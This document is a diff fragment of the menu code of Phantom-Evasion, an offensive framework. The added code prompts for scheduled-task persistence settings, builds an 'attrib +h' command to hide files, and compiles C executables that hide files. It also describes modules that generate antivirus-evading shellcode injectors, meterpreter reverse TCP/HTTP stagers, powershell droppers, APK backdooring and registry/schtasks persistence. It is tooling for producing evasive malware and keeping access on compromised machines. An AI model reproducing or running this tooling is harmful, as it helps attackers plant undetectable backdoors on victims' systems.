+               
+    elif PersistenceType == "3":   
+        print("\n [Help] hhmm:ss Timeformat,")
+        print("\n [Example:] execute after user has been idle a minute and half = 0001:30") 
+        if py_version[0] == "3":
+            TimeVar = input("\n [>] Insert idletime value: ") 
+        else:
+            TimeVar = raw_input("\n [>] Insert idletime value: ") 
+        while len(TimeVar) < 7:
+            print(bcolors.RED + "\n [-] Invalid time format" + bcolors.ENDC)
+            print("\n [Help] hhmm:ss Timeformat,")
+            print("\n [Example] execute after user has been idle a minute and half = 0001:30")
+            if py_version[0] == "3":
+                TimeVar = input("\n[>] Insert idletime value: ")  
+            else:
+                TimeVar = raw_input("\n[>] Insert idletime value: ")  
+    sleep(0.2)
+    print(bcolors.GREEN + "\n[>] Generating Persistence Cmdline...\n" + bcolors.ENDC)
+    sleep(1)
+    clear()
+
+    if platform.system() == "Linux":
+
+        subprocess.call(['python','Modules/post-exploitation/Windows_CMD_Persistence_Schtasks.py',FullPath,Taskname,PersistenceType,TimeVar])
+
+
+    elif platform.system() == "Windows":
+
+        subprocess.call(['py','Modules/post-exploitation/Windows_CMD_Persistence_Schtasks.py',FullPath,Taskname,PersistenceType,TimeVar])
+
+
+def Attrib_CMD():
+    clear()
+    py_version=platform.python_version()
+    if py_version[0] == "3":
+
+        Fullpath=input("\n[>] Insert fullpath to file: ")
+    else:
+        Fullpath=raw_input("\n[>] Insert fullpath to file: ")
+
+    cmdline="attrib +h " + Fullpath
+    clear()
+    print("\n" + bcolors.OCRA + bcolors.BOLD + "[>] Cmdline: " + bcolors.ENDC + bcolors.ENDC + cmdline)
+    Enter2Continue()
+
+
+def Windows_C_HiddenFiles():
+    clear()
+    py_version=platform.python_version()
+    if py_version[0] == "3":
+
+        CompileFor=input("\n[>] Insert compiler option (x86 or x64): ")
+        OutFile=input("\n[>] Insert output filename: ")
+    else:
+        CompileFor=raw_input("\n[>] Insert compiler option (x86 or x64): ")
+        OutFile=raw_input("\n[>] Insert output filename: ")
+
+    sleep(0.5)
+    print(bcolors.GREEN + "\n[>] Generating C code...\n" + bcolors.ENDC)
+
+    if platform.system() == "Linux":
+
+        subprocess.call(['python','Modules/post-exploitation/Windows_C_SetFilesAttributeHidden.py'])
+
+
+    elif platform.system() == "Windows":
+
+        subprocess.call(['py','Modules/post-exploitation/Windows_C_SetFilesAttributeHidden.py'])
+
+    sleep(1)
+
+    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
+
+    auto_compiler("windows",CompileFor,OutFile)
+
+    print("\n[<>] File saved in Phantom-Evasion folder\n")
+    Enter2Continue()
+
+def SelectHideMode():
+    clear()
+    py_version=platform.python_version()
+    print(bcolors.GREEN + "\n[>] Cmdline or Compiled executable\n" + bcolors.ENDC)
+    print("[1] Cmdline                                 (attrib)")
+    print("[2] Compiled Executable      (SetFilesAttribute API)")
+    print("[0] Main Menu\n")
+    if py_version[0] == "3":
+
+        Mode = input("\n[>] Select mode : ")
+    else:
+
+        Mode = raw_input("\n[>] Select mode : ")
+
+    if Mode == "1":
+
+        Attrib_CMD()
+
+    elif Mode == "2":
+
+        Windows_C_HiddenFiles()
+
+    elif Mode == "0":
+
+        Sleep(0.2)
+
+    else:
+        print("[-] Invalid Option")
+        Enter2Continue()
+        SelectHideMode()
+        return None
+
+def YesOrNo(Answerme):
+    if (Answerme == "y") or (Answerme == "Y") or (Answerme == "yes") or (Answerme == "Yes"):
+        return "True"
+    else:
+        return "False" 
+
 def description_printer(module_type):
     print("\n[+] MODULE DESCRIPTION:\n") 
     
 
     if module_type == "Polymorphic_MVA_mathinject_windows.py":
         description = ""
-        description += "  This Module use polymorphic multipath technique to forge\n"
-        description += "  Windows dropper written in c able to avoid \n"
-        description += "  payload's execution inside most AV sandbox \n\n"
+        description += "  This module generate and compile\n"
+        description += "  Windows executable written in c capable to \n"
+        description += "  inject and execute shellcode in memory (virtual) using \n"
+        description += "  VirtualAlloc API. \n\n"
         description += "  [>] Memory allocation type: VIRTUAL\n\n"
         description += "  [>] STATIC EVASION:\n"
         description += "  32bit ENCODER avaiable: \n"
@@ -1433,9 +1895,10 @@ def description_printer(module_type):
 
     elif module_type == "Polymorphic_MHA_mathinject_windows.py":
         description = ""
-        description += "  This Module use polymorphic multipath technique to forge\n"
-        description += "  Windows dropper written in c able to avoid \n"
-        description += "  payload's execution inside most AV sandbox \n\n"
+        description += "  This module generate and compile\n"
+        description += "  Windows executable written in c capable to \n"
+        description += "  inject and execute shellcode in memory (heap) using \n"
+        description += "  HeapAlloc and HeapCreate API. \n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
         description += "  [>] STATIC EVASION:\n"
         description += "  32bit ENCODER avaiable: \n"
@@ -1455,7 +1918,7 @@ def description_printer(module_type):
 
     elif module_type == "Polymorphic_MVA_NDC_LLGPA_mathinject_windows.py":
         description = ""
-        description += "  This Module behave like Polymorphic MultipathVirtualAlloc but\n"
+        description += "  This module behave like Polymorphic MultipathVirtualAlloc but\n"
         description += "  it use LoadLibrary() and GetProcAddress() to load at runtime VirtualAlloc \n"
         description += "  without direct call\n\n"
         description += "  [>] Memory allocation type: VIRTUAL\n\n"
@@ -1477,7 +1940,7 @@ def description_printer(module_type):
 
     elif module_type == "Polymorphic_MVA_NDC_GPAGMH_mathinject_windows.py":
         description = ""
-        description += "  This Module behave like Polymorphic MultipathVirtualAlloc but\n"
+        description += "  This module behave like Polymorphic MultipathVirtualAlloc but\n"
         description += "  it use GetProcAddress() and GetMonduleHandle() to load at runtime VirtualAlloc \n"
         description += "  without direct call\n\n"
         description += "  [>] Memory allocation type: VIRTUAL\n\n"
@@ -1499,7 +1962,7 @@ def description_printer(module_type):
 
     elif module_type == "Polymorphic_MHA_NDC_LLGPA_mathinject_windows.py":
         description = ""
-        description += "  This Module behave like Polymorphic MultipathVirtualAlloc but\n"
+        description += "  This module behave like Shellcode Injection HeapAlloc but\n"
         description += "  it use LoadLibrary() and GetProcAddress() to load at runtime HeapCreate and \n"
         description += "  HeapAlloc without direct call\n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
@@ -1522,7 +1985,7 @@ def description_printer(module_type):
 
     elif module_type == "Polymorphic_MHA_NDC_GPAGMH_mathinject_windows.py":
         description = ""
-        description += "  This Module behave like Polymorphic MultipathVirtualAlloc but\n"
+        description += "  This module behave like Shellcode Injection HeapAlloc but\n"
         description += "  it use GetProcAddress() and GetMonduleHandle() to load at runtime HeapCreate and \n"
         description += "  HeapAlloc without direct call\n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
@@ -1543,9 +2006,8 @@ def description_printer(module_type):
 
     elif module_type == "Polymorphic_PowershellOnelineDropper_windows.py":
         description = ""
-        description += "  This Module use polymorphic multipath technique to forge\n"
-        description += "  Windows powershell dropper written in c able to avoid \n"
-        description += "  payload's execution inside AVs sandbox \n\n"
+        description += "  This module generate and compile\n"
+        description += "  Windows powershell/cmd oneliner dropper written in c\n"
         description += "  [>] METHOD: system() call\n"
         description += "  [>] Payload type: Oneliner powershell payload\n\n"
         description += "  [>] Require powershell installed (target-side) \n"
@@ -1553,9 +2015,9 @@ def description_printer(module_type):
 
     elif module_type == "Polymorphic_PowershellScriptDropper_windows.py":
         description = ""
-        description += "  This Module use polymorphic multipath technique to forge\n"
-        description += "  Windows powershell script dropper written in c able to avoid \n"
-        description += "  payload's execution inside AVs sandbox \n\n"
+        description += "  This module generate and compile\n"
+        description += "  Windows executable written in c capable to\n"
+        description += "  execute a custom .ps1 file stored inside the executable \n\n"
         description += "  [>] METHOD: create hidden .ps1 file & system() call\n"
         description += "  [>] Payload type: Powershell Script payload\n\n"
         description += "  [>] Require powershell installed (target-side) \n"
@@ -1564,34 +2026,11 @@ def description_printer(module_type):
         description += "  work against 64 bit targets (like other modules) be sure to use\n"
         description += "  64 bit payloads in that case\n"
 
-
-    elif module_type == "MHA_mathinject_linux.py":
-        description = ""
-        description += "  This Module use static multipath technique to forge\n"
-        description += "  Linux dropper written in c able to avoid \n"
-        description += "  payload's execution inside most AV sandbox \n\n"
-        description += "  [>] Memory allocation type: HEAP\n\n"
-        description += "  [>] STATIC EVASION:\n"
-        description += "  32bit ENCODER avaiable: \n"
-        description += "  [1] x86/shikata_ga_nai\n"
-        description += "  [2] x86/shikata_ga_nai + Multibyte xor\n"
-        description += "  [3] x86/shikata_ga_nai + Double-key multibyte xor\n"
-        description += "  [4] x86/shikata_ga_nai + Triple-key multibyte xor\n"
-        description += "  64bit ENCODER avaiable: \n"
-        description += "  [1] x64/xor\n"
-        description += "  [2] x64/xor + Multibyte xor\n"
-        description += "  [3] x64/xor + Double-key multibyte xor\n"
-        description += "  [4] x64/xor + Triple-key multibyte xor\n"
-        description += "  [>] DYNAMIC EVASION:\n"
-        description += "  Resource consumption technique\n"
-        description += "  Sandbox-aware code \n"
-        description += "  [>] AUTOCOMPILE(cross platform): to ELF file \n"
-
     elif module_type == "Polymorphic_MHA_mathinject_linux.py":
         description = ""
-        description += "  This Module use polymorphic multipath technique to forge\n"
-        description += "  Linux dropper written in c able to avoid \n"
-        description += "  payload's execution inside most AV sandbox \n\n"
+        description += "  This module generate and compile\n"
+        description += "  Linux executable written in c capable to \n"
+        description += "  inject and execute shellcode in memory (heap) \n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
         description += "  [>] STATIC EVASION:\n"
         description += "  32bit ENCODER avaiable: \n"
@@ -1605,7 +2044,6 @@ def description_printer(module_type):
         description += "  [3] x64/xor + Double-key multibyte xor\n"
         description += "  [4] x64/xor + Triple-key multibyte xor\n"
         description += "  [>] DYNAMIC EVASION:\n"
-        description += "  What is my name technique \n"
         description += "  Resource consumption technique\n"
         description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to ELF file \n"
@@ -1666,11 +2104,13 @@ def description_printer(module_type):
         description += "  None  \n"
         description += "  [>] OUTFORMAT: dmg \n"
 
+
+
     elif module_type == "Smali_Droidmare":
 
         description = ""
-        description += "  This Module decompiles with apktool\n"
-        description += "  msfvenom apk payload, modify smali code and \n"
+        description += "  This Module baksmali msfvenom apk payloads\n"
+        description += "  with apktool, modifies smali code, \n"
         description += "  rebuild and resign the new apk  \n\n"
         description += "  [>] Support existing apk backdooring\n\n"
         description += "  [>] STATIC EVASION:\n"
@@ -1680,6 +2120,108 @@ def description_printer(module_type):
         description += "  [>] DYNAMIC EVASION:\n"
         description += "  counters injection in method\n"
         description += "  [>] OUTFORMAT: Apk \n"
+
+    elif module_type == "Polymorphic_BashOnelinerDropper_mathinject_linux.py":
+        description = ""
+        description += "  This Module generate and compile \n"
+        description += "  Linux oneline payload dropper written in c \n"
+        description += "  [>] METHOD: system() call\n"
+        description += "  [>] Payload type: Oneliner payload\n\n"
+
+    elif module_type == "Polymorphic_C_x86ReverseTcpMeterpreter_windows.py":
+
+        description = ""
+        description += "  This Module generate and compile\n"
+        description += "  32bit pure c meterpreter reverse tcp stagers. \n"
+        description += "  Require msfconsole multi/handler listener\n"
+        description += "  with payload set to windows/meterpreter/reverse_tcp\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+
+    elif module_type == "Polymorphic_C_x86ReverseHttpMeterpreter_windows.py":
+
+        description = ""
+        description += "  This Module generate and compile\n"
+        description += "  32bit pure c meterpreter reverse http stagers. \n"
+        description += "  Require msfconsole multi/handler listener\n"
+        description += "  with payload set to windows/meterpreter/reverse_http\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+        # POST-EXPLOITATION
+
+    elif module_type == "Windows_C_Persistence_Startup.py":
+
+        description = ""
+        description += "  This module generate and compile\n"
+        description += "  persistence executables that accept a given path to file \n"
+        description += "  and use RegCreateKeyExW to add key to register\n\n"
+        description += "  [>] PERSISTENCE TYPE:\n"
+        description += "  At user login\n"   
+        description += "  [>] PERSISTENCE PRIVILEGE:\n"
+        description += "  Userland/Admin\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+
+    elif module_type == "Windows_CMD_Persistence_REG":
+
+        description = ""
+        description += "  This Module generate \n"
+        description += "  persistence cmdline oneliners \n"
+        description += "  which uses reg to add key to register\n\n"
+        description += "  [>] PERSISTENCE TYPE:\n"
+        description += "  At user login\n"   
+        description += "  [>] PERSISTENCE PRIVILEGE:\n"
+        description += "  Userland\n"
+
+    elif module_type == "Windows_C_Persistence_TimeBased.py":
+
+        description = ""
+        description += "  This module generate and compile\n"
+        description += "  executables that periodically check  \n"
+        description += "  if the specified process is alive otherwise WinExec API will be used\n"
+        description += "  to launch a specified file\n"
+        description += "  [>] PERSISTENCE TYPE:\n"
+        description += "  time based \n"
+        description += "  (need to be combined with a startup persistence module)\n"   
+        description += "  [>] PERSISTENCE PRIVILEGE:\n"
+        description += "  Userland/Admin\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+
+    elif module_type == "Windows_CMD_Persistence_Schtasks.py":
+
+        description = ""
+        description += "  This module generate \n"
+        description += "  persistence cmdline oneliners \n"
+        description += "  schtasks is used to schedule task \n\n"
+        description += "  [>] PERSISTENCE TYPE:\n"
+        description += "  At user login\n" 
+        description += "  At daily time\n" 
+        description += "  if user has been idle for x seconds\n"  
+        description += "  [>] PERSISTENCE PRIVILEGE:\n"
+        description += "  Admin\n"
+
+
 
     else: 
         description = "None"
